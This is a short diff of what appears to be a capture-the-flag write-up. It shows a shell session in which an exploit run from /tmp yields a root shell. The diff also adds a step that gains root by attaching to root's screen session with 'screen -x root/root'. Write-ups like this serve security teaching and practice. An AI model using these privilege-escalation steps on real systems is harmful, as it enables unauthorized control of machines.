@@ -48,3 +48,8 @@ $ cd /tmp; ./exploit
 # whoami
 root
 ```
+
+4. The intended solution seems to be using the root session of `screen` to become root.
+```
+$ screen -x root/root
+```
